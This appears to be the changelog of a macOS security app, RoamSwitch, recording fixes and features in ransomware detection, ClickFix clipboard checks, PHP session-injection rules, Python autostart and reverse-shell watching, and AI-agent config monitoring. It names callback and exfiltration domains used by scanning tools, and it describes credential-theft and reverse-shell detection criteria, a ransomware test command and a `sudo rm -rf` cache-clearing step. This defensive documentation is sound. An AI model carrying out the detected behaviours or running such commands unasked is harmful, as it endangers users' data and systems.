- (1.15.1) **Added: the ransomware emergency window now points to ways of getting encrypted files back.** It shows links to No More Ransom, which collects free decryption tools, and to the Japanese National Police Agency's ransomware page, plus a QR code of the first, because this Mac cannot open it while isolated. Decryption tools exist only for some families whose workings have been analysed, and RoamSwitch itself does not decrypt files. The text also says to remove the malware before using a tool, to keep the encrypted files and the ransom note, and not to pay. Translations are based on machine translation and have not been checked by native speakers (other than Japanese).
- (1.15.1) **Fixed: the helper now checks when a process started before it pauses, resumes or ends it.** If the PID passed to another process after the protected-process check, an unrelated process could receive the signal. The signal is not sent if the start time (to the microsecond) differs between the check and the moment of sending. A reuse that happens between the app's detection and its request to the helper is not covered by this check (macOS has no pidfd).
- (1.16.0) **Fixed: in the agent-setup audit and MCP configuration audit windows, the "detail" line was in English even in other display languages** (`mode 666 is writable by every user`, `enableAllProjectMcpServers is true`, and so on). It now follows the display language (10 languages). The `detail` in MCP responses and SARIF stays English, because machines read it. The translations are based on machine translation and have not been checked by native speakers (other than Japanese).
- (1.16.0) **Fixed: the critical-file tamper watch announced the same change that nobody had accepted (sudoers.d, pam.d and the like) at every app launch.** The baseline never advances on its own, so the same change is found every time. What was announced is now saved and carried over, and cleared when you accept the state with "Update the critical-file baseline to the current state…" in the menu. On the first launch after this update, a change that is still waiting is announced once.
- (1.16.0) **Fixed: when the vulnerability acceptance file could not be read or was damaged, accepting a new one erased every acceptance in it.** Nothing is saved or revoked on a file that cannot be read, is damaged or has an unknown version. A damaged file is left as it is, and a copy of its contents is kept once in the same folder. The window now says why saving failed: cannot be read, damaged, or other.
- (1.16.0) **Added: the web server worker crash notification now covers PHP-FPM** (Pro). It also reads the PHP-FPM error log (`WARNING: [pool www] child N exited on signal 11 (SIGSEGV) …`) and notifies when workers die of a crash signal three times within five minutes. A PHP fatal error (`exited with code 255`), SIGKILL and SIGTERM are not counted. The logs are Homebrew's `/opt/homebrew/var/log/php-fpm.log` and `/usr/local/var/log/php-fpm.log`, and the absolute `error_log` paths in `php-fpm.conf`. I confirmed that the log lines a real `php-fpm` (PHP 8.3) writes match what the parser expects. All app tests (2,086, with 1 skipped as before) pass.
- (1.16.0) The bundled apps are now AccessScope 0.4.3 and PersonalSOC 0.2.2 (PathScope 0.2.0 is unchanged).
- (1.16.1) **Fixed: in the ransomware entropy detection, interpreters that ship with macOS (`perl`, `python3`, `ruby`, shells and the like) were treated as "safe writers" whatever script they ran.** A script that rewrites part of many files, run with the system `perl`, started the detection and the Air-Gap, yet `perl` was not paused and every file was rewritten. An interpreter is now safe only when the script it runs is in an OS location (`-c` and standard input, where the script is unknown, are not safe). Homebrew and other package-manager `node` and `python3` stay as before.
- (1.16.1) **Fixed: the entropy detection named Spotlight (`mds` and others) as the writer.** Spotlight opens every changed file to read it, so it looked like the writer every time. A process that only has a file open to read, and the OS background services, are no longer the writer. `lsof` is taken three times, 0.15 s apart; when nothing is found, a program that started shortly before the burst and is tied to the watched folders is paused if there is only one. If there is still no one, the alert says "The writer could not be identified" and only the network is cut.
- (1.16.1) **Fixed: when an entropy burst led to the Air-Gap, the "cause" in the notification, menu and guide read "tampering with ransomware decoy files".** No decoy was touched. It now says "many files rewritten in a short time (entropy burst)".
- (1.16.1) **Fixed: a listener bound to an alias address on `lo0` (the loopback interface) was reported as "port exposed" and blocked automatically.** A listener on an address that is configured on `lo0` is not exposed. `0.0.0.0` and `::` are still exposed.
- (1.16.1) **Fixed: Apple-signed interpreters under `/System/Library`, such as Apple's `ruby`, were not detected when they opened a port.** An interpreter is no longer taken for a system service because of its signature.
- (1.16.2) **Fixed: when RoamSwitch reloaded the main pf ruleset, the `nat-anchor` and similar calls of the standard `pf.conf` were lost.** The standard macOS `pf.conf` calls the anchors under `com.apple/*` in this order: normalisation (`scrub-anchor`), NAT (`nat-anchor`), redirection (`rdr-anchor`), bandwidth control (`dummynet-anchor`). A tool that puts NAT rules into an anchor under that name, such as Internet Sharing, stopped working after RoamSwitch reloaded the ruleset. The same four calls are now added right after `set skip on lo0`.
- (1.16.2) **Added: a notification right away when an AI agent's setup changes from the accepted state** (Pro): it compares with the state you accepted with "Accept this state" in the audit window. It watches `.claude`, `.codex`, `.cursor`, `.gemini`, `.agents` and `.openclaw` in the home folder, and the instruction files of the registered project folders (`CLAUDE.md`, `AGENTS.md`, `.mcp.json` and the like). File changes arrive through FSEvents; once the writes settle, the same check as the window runs. The notice lists up to five changed files. The same change is not announced twice, and it stops when you press "Accept this state". While there is no accepted state, nothing is announced. What events miss is caught by a check every five minutes and by a look at the modification time of `~/.claude.json` every five seconds.
- (1.16.2) **Fixed: when comparing an AI agent's setup with the accepted state, a hook that disappeared was not counted as "weakened"** (`agent_settings_weakened`): a hook of the accepted state that is gone with nothing replacing it is now counted and reported as a finding (medium). A hook that was only edited is still "added or changed", as before.
- (1.16.2) **Fixed: a paused (SIGSTOP) process could start running again with nobody releasing it**: when the parent shell exits and the process group becomes orphaned, the kernel sends SIGHUP and SIGCONT, and the stopped process runs again. The helper now checks the processes it paused every 10 ms and stops one again if it runs. A `kill -CONT` sent by hand is undone quickly too. Release from the RoamSwitch window; releasing removes the watch before it sends the resume signal. The watch ends when the process exits or when another process takes over the pid (the start time tells).
- (1.16.2) **Fixed: when identifying the writer in ransomware detection, an encrypting program started from a shell script was mistaken for the shell that started it**: when a runner's bash script started perl with `cd ~/Downloads && (nohup perl x.pl ~/Documents/notes &)`, bash was paused and perl rewrote all 150 files. There were two causes. When `lsof` could not catch the write, any process that merely had the watched folder as its working directory was an equally strong candidate, and the one with the smaller pid won, so the bash that started earlier was always chosen (a perl started in a bracketed subshell becomes a child of launchd once its parent ends, so the parent-child link could not be followed either). The search through the process list kept both bash and perl as candidates, ended with "cannot decide" and paused nobody. Among candidates that could not be seen writing, the ones whose own command line points at the watched folder (the working directory does not count) now come first, then the ones that started more recently. The search through the process list also narrows to those when several remain. If several different programs still remain, nobody is named, as before. When a suspect is paused, its descendants (up to 32) are paused with it and resumed together on release. Descendants are paused only for an interpreter or an unsigned program.
- (1.16.2) **Fixed: the typosquatting check of the package CVE scan, its result tables and the CSV export**: `@eslint/js` was reported as similar to `ws`. A scoped npm name is compared without its scope, and names of three letters or fewer are no longer compared by edit distance. With several folders registered, you could not tell which folder a result belonged to, so the typosquatting results and the install-script list gained a "Project" column (the CSV carries the folder in its first column, and the MCP result in `projectDir`). The CSV export put a `'` in front of scoped npm package names (`@scope/name`); a value that is exactly `@scope/name`, made only of letters, digits and `. _ ~ -`, no longer gets one. A value that looks like a formula, such as `@SUM(A1)`, still does.
- (1.16.2) **Fixed: the EPSS columns stayed empty on some Macs**: a Mac whose CVE maps were installed before the feeds carried EPSS holds a map without an EPSS date, so EPSS stayed empty until the next periodic check. When an installed map has no EPSS date, the app now fetches it on the next daily pass instead of waiting (at most once a day). Once the date is there, this stops.
- (1.16.2) **Changed: the automatic check for CVE data now runs about once a week instead of about every 30 days** (package CVE scan, the CVE map of the active vulnerability check, and the list of popular package names for the typosquatting check): the maps are rebuilt once a week on the publishing side, and the check now matches it. The daily manifest check, the threat feed and the web rules are unchanged. The in-app text (10 languages), the knowledge base and the MCP tool descriptions were updated to match. Translations of the changed text are based on machine translation and have not been checked by native speakers (other than Japanese).
- (1.16.2) The bundled apps are unchanged (AccessScope 0.4.3, PersonalSOC 0.2.2, PathScope 0.2.0).
- (1.17.0) **Fixed: the menu check mark said "on" for a protection that was not actually working.** The check mark showed only whether the setting was on, so with Pro lapsed, the helper not connected, or an input that could not be read, the protection still looked active. The 24 items of the menu now show ✅ (working), 🟡 (working only in part) or ⚠️ (not working), with the reason. 15 seconds after the app starts, one notification names the protections that are stopped (also when the app starts with Pro lapsed). A helper that is not connected is notified once, after two checks in a row. The MCP `get_guard_status` builds the same list. When the records the app writes (enforcement point, watchdog, helper connection) are older than 180 seconds, they are treated as "unknown".
- (1.17.0) **Fixed: individual protections now show why they are stopped or what they cannot see.**
  - **Recovery snapshots**: a failure was shown nowhere. It now appears in the recovery window and in MCP (`lastSnapshotError`), and three failures in a row raise one notification.
  - **Lock-file watch**: with no watched folder it shows ⚠️ "watching nothing" (MCP: `no_folders_registered`).
  - **Decoys and honeytokens**: the number placed and the reason for any that could not be placed are shown (MCP: `placement`). With none placed, there is no check mark and it shows ⚠️.
  - **Web server worker crash watch** (Pro): the settings window shows the number of logs followed, and the reason when there are none (MCP: `webWorkerCrashWatch`).
  - **Link guard system extension**: while approval is pending it works only from the `/etc/hosts` list and cannot stop browsers that encrypt DNS (DoH). If approval is still pending after 10 minutes, one notification is raised (at most once every 3 days) and the menu shows 🟡 with the reason. The MCP `linkGuard` returns `partial` with the reason when the enforcement point is not approved or not active. In a development build, or with the extension not approved, it is always 🟡, because it works from hosts only.
  - **Docker guard**: when `docker ps` does not answer, the menu shows "stopped" with the reason. The enable window and the menu now say that containers already running when you enabled it are not inspected, and that the check runs every 20 seconds.
  - **Bluetooth guard**: when `blueutil` can no longer be found, it shows ⚠️ and the reason ("stopped", not "not installed") and sends a notification.
  - **Change detection of AI agent setup** (Pro): it needs an accepted baseline, but nothing showed why it was stopped. The audit window shows the working state and what is missing, and the menu adds "no baseline". The MCP `get_guard_status` gains `agentSetupWatch` with the reasons `no_baseline` and `pro_not_active`.
  - **Data updates**: for the two kinds of CVE data used by the package CVE scan and for the link guard lists, the last successful update and the latest failure are shown in each CVE window, in the menu and in `get_guard_status` (`feedUpdates`).
  - **Homebrew**: when Homebrew is missing, `brew` fails, or there are 0 packages, the window shows a gray "nothing was checked" with the number of packages checked, not a green "nothing found" (MCP: `homebrewInventory`).
  - **USB list and incident records**: when `system_profiler` fails, the window shows the failed read and the time of the last good read instead of "no external USB devices", and does not replace the list (so a device that comes back is not reported as a new connection). When the incident record cannot be read, the window and MCP (`recordFile`) say "could not be read" instead of showing an empty list. A broken file is moved to `.bak` before the next record is written.
  - **Detection coverage map (`get_detection_coverage`)**: the watchdog carries a `liveState` for T1562.001, and each technique can carry an optional `liveStateReason`. `agentSetupWatch` is in the guard list.
- (1.17.0) **Added: the app shows when macOS notifications are not allowed.** With notifications denied, or the style set to "None", no warning reached the screen. The app shows this state in the top row of the menu, in the diagnosis window, in a band of the notification history window and in the onboarding, and can open System Settings.
- (1.17.0) **Added: the self-monitor (Watchdog) can be registered with your consent (off by default).** The registration file was not inside the app and nothing registered it, so a normal install did not run the self-monitor. The plist is now inside the app in `BundleProgram` form (under `Contents/Library/LaunchAgents/`), and a menu item registers it with `SMAppService.agent` after you agree. If an older script left a plist, it is booted out and removed with your consent before registering. The state (on, waiting for approval, off) appears in the menu and the detection coverage, and uninstalling removes the registration. **The self-monitor does not turn on by itself; register it from the menu item.** The failure to register was fixed in 1.17.2.
- (1.17.0) **Added: ClickFix gets a check of the clipboard before you paste, and a setting that makes the history readable right after a command runs** (Pro; the ClickFix switch is off by default). With zsh's default settings, a pasted command is not written to the history until the shell exits. Measured, the Terminal session history (`~/.zsh_sessions/*.historynew`) is also written only at exit. So ClickFix detection came only after the tab was closed.
  - **Clipboard check**: the clipboard is read only when its change count changes, and matched in memory with the same rules as the existing ClickFix check. The content is not stored. On a match it notifies "This may be a dangerous command if pasted. Do not paste it into a terminal." The notification shows only the rule name and the first 8 characters, and a button empties the clipboard. It never empties the clipboard by itself, and it does not quarantine or start Air-Gap. It reads only on macOS 15.4 or later when "Paste from Other Apps" is set to Allow. Otherwise it does not read, and the menu shows 🟡 "clipboard check is not allowed" (MCP reader: `clipboard_not_permitted`).
  - **`INC_APPEND_HISTORY` setting**: right after you enable ClickFix, and from the menu, you can add `setopt INC_APPEND_HISTORY` to `~/.zshrc` with your consent. It shows the line and the file, and writes only if you agree. Before writing it copies the file to `~/.zshrc.roamswitch-backup` (an existing backup is not overwritten; a timestamped name is used). It does nothing if the setting is already there. The undo button removes only the added line. It does not rewrite a symbolic link. **It does not affect Terminal tabs that are already open; it takes effect from a new tab.**
  - **Without the setting**: the end of the menu says "not detected until the tab is closed", and the enable window, `get_guard_status`, the help and the knowledge base state the same limit and the advice. If `~/.zshrc` already has it, this note is not shown.
  - **Relation to the existing auto-clear**: `SecretLeakAuditor` (free, on by default) also detects a ClickFix copy and empties the clipboard automatically. While the ClickFix guard is on, that automatic clearing is stopped and the new warning replaces it. With the guard off, it works as before.
- (1.17.0) **Fixed: when the Wi-Fi name could not be obtained, the menu said "not connected".** From macOS 14, an app without location permission does not get the Wi-Fi name. While connected, only the signal and the encryption type are available. With a signal but no name it now says "Connected (name not available)", judges the encryption type without the name, and shows the Open or WEP warning. Location permission is requested only when you press the item after reading its explanation.
- (1.17.0) **Changed: the onboarding and the help now match how the app works.** The sentence "the free version alone runs all the basic automatic defense" was wrong; what runs free is switching per network and manual checks. A new page explains the notification permission and the permissions needed later (Full Disk Access, system extension, Accessibility, Location). Right after you first enable Pro, one notification lists the protections that turned on, the ones you have to turn on yourself, and why some do not work yet. The help FAQ and the knowledge base (10 languages) are updated too. The added texts are based on machine translation and have not been reviewed by native speakers (other than Japanese).
- (1.17.0) **Added: an active check result shows whether the same check was judged safe last time** (`previouslySafeAt` of the MCP `run_active_vuln_scan`). It is set only when the last result of the same check on the same port was "safe". Runs that could not connect are skipped. It does not claim that a fix was reverted; it returns only the fact in the log.
- (1.17.0) **Fixed: the knowledge base entry "ransomware recovery" was returned in no language.** It was not registered in the catalog. It is registered now.
- (1.17.1) **Added: PHP session files are checked for injected code** (the daily scan and the manual scan). This prepares for the two critical PHP core vulnerabilities that php.net fixed on 2026-10-21: GHSA-w8hw-w9fx-j79w (CVE-2026-109618, corruption through memory exhaustion) and GHSA-6wmf-4rv5-p3rp (CVE-2026-109619, stale global state). Both lead to remote code execution. One path of CVE-2026-109619 is `session.upload_progress`, which writes client-chosen text into the session file. The web rules got a file kind `session` (a name of `sess_` and an ID only, no extension) and two rules. The bundled rules went from 18 to 20 (the same as on Linux).
  - `php-session-upload-progress-code` (critical). The `upload_progress` marker next to a PHP open tag. This is what an injection leaves.
  - `php-session-code` (high). A PHP open tag. A session file holds data only; with a tag in it, a page that includes the file runs the code.
  - **Where it looks**: the daily scan (Pro) and "Check development web folders now" in Settings also check the PHP session directories: `session.save_path` of the installed PHPs (php.ini and FPM pools), `/tmp`, `/private/var/tmp` and this Mac's temporary folder when a setting is empty, and MAMP's `/Applications/MAMP/tmp/php`. A directory is listed one level deep and only its `sess_` files are read. A scan of a folder you picked looks at that folder only.
- (1.17.1) **Added: a "Check PHP settings" button in Settings** (in the watched-folders screen, under "Web shell detection rules"). It checks whether the PHP on this Mac is exposed to the two advisories above. It only reads and uses no network. A PHP executable is started only to print its version.
  - **Version**: the `php`, `php-fpm` and `frankenphp` found in Homebrew (`/opt/homebrew` and `/usr/local`, `php@*`), Herd, MAMP and PATH are compared with the fixed releases (8.2.35, 8.3.36, 8.4.27, 8.5.12). A version before the fixed release is "high". PHP 8.1 and older have no fix from the PHP project and are "high". A branch newer than 8.5 cannot be judged and is "medium". The check does not read OS package changelogs, so it judges by the version number only.
  - **How PHP runs and settings**: Apache mod_php is "medium". PHP-FPM and FrankenPHP are "info". `session.upload_progress.enabled` (on when nothing sets it) is "medium" when on. On PHP 8.5, `fatal_error_backtraces` when on is "high" for a build before the fix and "medium" otherwise. Settings are read from php.ini, the FPM pools and the Apache configuration files.
  - **Session files**: checked with the rules above; an injection is "critical" or "high".
  - **Result**: with anything "high" or worse it says "action needed" with the count. It judges these two advisories only.
- (1.17.1) **Added: the autostart watch (Pro) also covers the files Python runs by itself at every start** (the same judgement as on Linux). Python runs `.pth` files in `site-packages` (each line that begins with `import` is executed), `sitecustomize.py` and `usercustomize.py` every time it starts, in any program. If a supply-chain release adds one of them, every Python of that environment runs it, `pip` included (ATT&CK T1546.018). The watch looks at the `site-packages` of the Python installations (Homebrew, python.org, the system's, pyenv, uv, pipx, conda and the like) and at virtual environments under the home folder (found by `pyvenv.cfg`, four folders deep, searched again every minute; Desktop, Documents, Downloads and Library are not walked, because that would raise a permission prompt). A module that a `.pth` file imports from its own folder is judged in the same way. Only code that reads three or more kinds of credential store, decodes data and runs it, runs what it downloaded, or has the shape of a reverse shell is notified. Ordinary `.pth` files are only recorded. Code that hides its strings, environments elsewhere and environments inside containers are not seen.
- **Link protection and the domain check** (1.17.2): link protection notifies about connections to the external servers of vulnerability-scanning tools (interact.sh, oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me, burpcollaborator.net, oastify.com, dnslog.cn, ceye.io and their subdomains), when the system extension is approved (notice only, once an hour per host). Settings gained a "Domain check" (SPF, DMARC, CAA, DNSSEC, MTA-STS and the registration expiry of your own domains, checked only when you press the button).
- **Timeline and self-monitoring** (1.17.2): timeline records carry the record that caused them and references to the evidence bundle (`parentEventID`, `rootEventID`, `evidenceRefs`). Fixed self-monitoring (automatic restart after a crash) that could not be turned on. The watchdog is now a small app (`Contents/Library/LoginItems/RoamSwitchWatchdog.app`), and a registration left by the old script is replaced when you turn it on in the app.
- **The self-monitoring watchdog app now has an icon** (1.17.3): since 1.17.2 the watchdog is a small separate app (`Contents/Library/LoginItems/RoamSwitchWatchdog.app`), and it showed a blank icon in System Settings under "Notifications" and "Login Items". It now carries the RoamSwitch icon.
- **Changed: the self-monitoring watchdog is now named "RoamSwitch Self-Monitoring"** (10 languages). System Settings (Notifications, Login Items) showed it as "RoamSwitchWatchdog". (1.17.4)
- **Changed: the screens now say that self-monitoring starts working at your next login after you approve it** (Settings, Help, the knowledge base and the manual; 10 languages). On one virtual machine, the watchdog did not start right after approval; it started at the next login. (1.17.4)
- **Changed: the menu bar menu groups related items under headings.** The "Malware protection (XProtect & ClamAV)" submenu runs in this order: antivirus, web/mail/links, ransomware and credentials, suspicious behavior detection, logs/tamper detection/forwarding, manual audits, function checks. The "Ports and devices" submenu runs: network spoofing and sniffing, ports and intrusion detection, vulnerability scans and sensors, followed by USB and Bluetooth. Before, on/off items, submenus and manual checks were mixed. The headings are in 10 languages. In the main menu, self-monitoring now sits next to "Launch at login". (1.17.4)
- **Changed: "Launch at login" is marked like the other on/off items.** It shows ✅ when on and 🚀 when off, instead of the system check mark. (1.17.4)
- **Known: on a Mac updated from 1.17.2, the watchdog's icon may stay blank in System Settings > Notifications.** The 1.17.2 watchdog had no icon, and macOS keeps that blank state in its icon cache. A new version number does not clear it, and neither does `lsregister` or restarting Notification Center. When a notification actually appears, it carries the RoamSwitch icon. On a disposable macOS virtual machine, restarting the Mac fixed it; this was confirmed once. If it does not, run `sudo rm -rf /Library/Caches/com.apple.iconservices.store` and restart. A freshly installed Mac shows it correctly from the start. The name is updated without a new version number. (1.17.4)
- **Crash at launch, and the MCP container** (1.17.6): the app could crash at launch (the 1.17.5 crash report). During start-up it ran `which clamscan` and similar commands synchronously, and that wait ran the main thread's work so that a waiting task re-entered the state still being initialized. On the main thread it now waits by checking whether the process is still running (every synchronous wait in the app was replaced). MCP now reads the notification history and similar data from the same container as the app (the MCP server is a separate process and read its own container, so `get_notification_history` could not see the history the app recorded, and `audit_security_logs` built a baseline different from the app's periodic audit).
- **Recording of which process opened a file** (1.17.6, a sub-option of the execution recorder, Pro, off by default): macOS does not tell an app which process opened a file, so the reader of a decoy and the writer of an AI-agent setting or a start-up entry appeared as "unknown" in notifications. When turned on, the helper runs `eslogger` and the notification shows the process (path, PID, command, parent, signature) that read a decoy or wrote a setting or an auto-start. Records are kept in memory for 180 seconds at most and never written to disk. It uses CPU: `eslogger` runs as two processes, the write side (`create` `rename` `unlink` `clone` `copyfile` `truncate`) measured about 3 events per second and about 0.2% of one core, the `open` side (reads and appends) about 256 events per second and 5 to 8%, with a default limit of 12% of one core (6, 12, 20 or 30% in settings). If it stays above the limit only the `open` side stops (it waits 15 minutes, 1 hour, 6 hours and resumes) and the write side keeps working. The recorder screen shows what cannot be known while it is stopped, and the confirmation shown when you turn it on states the measurement and the limit. It also watches shells of other accounts, root included (the helper reads their connections).
- **ATT&CK technique IDs** (1.17.6): the IDs in detection coverage and the Navigator layer (v20) are IDs of v19 or later (`T1562.001` and `T1562.006` are `T1685`, `T1562.004` is `T1686`, `T1070.002` is `T1685.006`). If you count by the old IDs, read them as the new ones.
- **The ledger of suspended processes, and the display of stopped updates** (1.17.6): the list of suspended processes is kept on the helper's disk, so watching and releasing work after a restart (when the helper restarted the watch disappeared, and when the app quit, crashed or updated there was no way to release a legitimate process that had been stopped). At launch, and from "Check suspended processes…" in the menu "Recovery and uninstall", the app lists the remaining processes and lets you choose "Resume all" or "Leave stopped". A stopped update of detection data is shown in the menu and in `get_guard_status` (package CVE map, web rules, the link list of link protection, CVE map; when not checked for a week; before, only a failure was visible).
- **Matching and diagnosis** (1.17.6): package CVE matching shows the CISA KEV mark and "no fixed version" for dependencies (KEV entries come first with a "KEV" column and a footnote; older maps are still read as before). The manual link check (the screen and `audit_url_safety`) matches the same on-device threat feed as link protection (a host or parent domain on the feed is added as a critical risk; it only reads, uses no network and does not match IP addresses). `verify_security_findings` tells "fixed" from "did not apply from the start" (`change`: `fixed` / `already_resolved` / `still_present` / `newly_present` / `no_earlier_check`; the app records only the results it could judge after each diagnosis).
- **Ransomware and the range of scans** (1.17.6): partial encryption that rewrites only 256 bytes every 2 KiB is found by a 256-byte window rule (the first 256 KiB is split into 256-byte windows, and a file is counted when random-looking windows appear at 8 or more places, cover 5 to 30% of the windows and repeat at the same interval over 4 or more windows; a single run of compressed data, as in a PDF or a database, is not counted; on about 1.02 million ordinary files there were 0 additional detections; `defaults write` of `RoamSwitch.RansomwareEntropyWindowRule` to `false` turns off only the 4 KiB and 256-byte window checks). The folder scans of static signatures and web rules read files up to 64 MB in full (only the first 4 MB was read, so code placed after it was invisible; larger files are read at the first and last 4 MB, and images, video, archives and the like at the head and tail only, which is not counted as a gap).
- **Start-up plants and service detections** (1.17.6): the watch for start-up plants is wider (`.git/hooks` of working copies and the folders `core.hooksPath` points to, submodules and linked worktrees included, up to 4 levels under the home and 400 copies; fish `conf.d/*.fish`, `.bash_logout`, `/etc/zlogin`, `/etc/ssh/sshrc` and Folder Actions; a notification comes only when a suspicious line is newly added, and when a limit is exceeded the menu and `get_guard_status` say "Partly working: what exceeds the limit is not watched"). A shell started by a service account is detected (`exec.shell_from_service`: a service such as httpd, nginx, php-fpm, java, tomcat, gunicorn or node starts a shell, or a one-liner such as `python -c`, directly under the service account such as `_www`; both the account and the parent process must match). Changes of the DNS servers saved on a network service are watched too (when a DNS server the service never had is added by `networksetup -setdnsservers` or System Settings, a weak notification is shown once; routers, loopback, well-known public resolvers and RoamSwitch's secure DNS are excluded; who wrote it is unknown and the notification says so; "Accept" makes it known). A setting lets reverse-shell detection include destinations on the local network (`RoamSwitch.ReverseShellWatch.IncludePrivateV1` and a menu item; the default is unchanged, they are not watched; when on, RFC 1918, CGNAT (Tailscale) and link-local peers are treated as external).
- **Auto-start entries signed ad hoc** (1.17.6, Pro): the LaunchAgent and LaunchDaemon watch judged a program by whether its signature was intact, so a program with an ad-hoc signature (one with no certificate behind it; on Apple silicon every executable that `clang` or `cargo` builds has one) passed the check and was missed. The macOS ransomware Heartbreaker (2026-10) settles in through `~/Library/LaunchAgents/com.network.startup.plist` in exactly this way. A registration whose program is signed ad hoc and sits in the Downloads folder, on the Desktop, in a temporary folder or in a hidden folder (ordinary ones such as `.local` and `.cargo` excepted) is now reported as "A new auto-launch registration was detected" (Homebrew and apps in `/Applications` are not affected). In a disposable macOS 26.6 virtual machine, a plist shaped like Heartbreaker's was reported about 1 second after it was placed (a `bash` Base64 plist, about 2 seconds), and a plist pointing at the Apple-signed `/usr/bin/true` was not reported. The registration itself cannot be stopped (EndpointSecurity is not used); the report comes after it is written.
- **PHP check and bundled apps** (1.17.6): the PHP check also looked at CVE-2026-115560, which has no fix yet (the conditions and the split between High and Info are the same as in the Linux `php-check`; the code was read from the PHP files of Homebrew `/opt/homebrew/var/www` and `/usr/local/var/www`, MAMP, `/Library/WebServer/Documents`, `~/Sites` and `~/Herd`; the button was removed in 1.17.9 and the judgment is part of the diagnosis). The bundled PathScope.app carries `pathscope-diff` and `pathscope-fleet`.
- **Scope of verification and checks** (1.17.6): what was not checked on a real device was the recording of the process that opened a file (it went as far as a load measurement of `eslogger` alone, this Mac, root, ordinary use, 60 seconds, and unit tests of the parser, the line filter and the load limit; the full operation was not checked), the changes that involve replacing the helper (the ledger of suspended processes and `listFrozenProcesses`, the query for root's shells; built not to call an old helper, but replacing the helper was not tried), and the detection of ad-hoc signed auto-start entries (checked in a disposable virtual machine and by unit tests, not on an everyday Mac). The full Mac app tests (2561 tests) passed, with 1 skipped as before. The bundled apps were AccessScope 1.0.2, PersonalSOC 1.0.1, PathScope 1.0.1.

## 1.9.6 - 1.9.54 (summarized)

Everything in these releases, grouped by topic. The full text of each entry is in the git history of this file.

- **Isolation (Air-Gap) reworked** (1.9.52, 1.9.23): what triggered an isolation decides how it ends. A tampered ransomware decoy, a confirmed XProtect detection and a manual isolation chosen from an ARP warning are "high confidence"; the rest (ClickFix, port anomalies, and so on) are "low confidence". Low confidence releases by itself after 10 minutes. High confidence does not: full isolation continues up to a limit (1 hour by default), then releases if the cause is confirmed gone, and otherwise moves to a "degraded mode" that keeps new connections blocked and never opens by time. Connections already open are cut when the isolation starts, and the state survives a helper restart. The Wi-Fi radio turned off by an isolation now comes back after an app crash or a restart (an independent watchdog, 1.9.23). (In 1.9.52 an isolation caused by ARP spoofing was not released automatically; 1.10.5 changed that.)
- **Ransomware** (1.9.50, 1.9.51): "Ransomware Recovery" (Pro) takes APFS local snapshots every 6 hours by default (off, 1, 3, 6, 12 or 24 hours), takes one at detection time, and pauses pruning for up to 7 days so the last generation before the encryption stays; recovery is manual, file by file, into `~/RoamSwitch-Recovered/`, never overwriting current files (needs Full Disk Access for the helper). The read-only MCP tool `get_ransomware_recovery_snapshots` lists the snapshots.
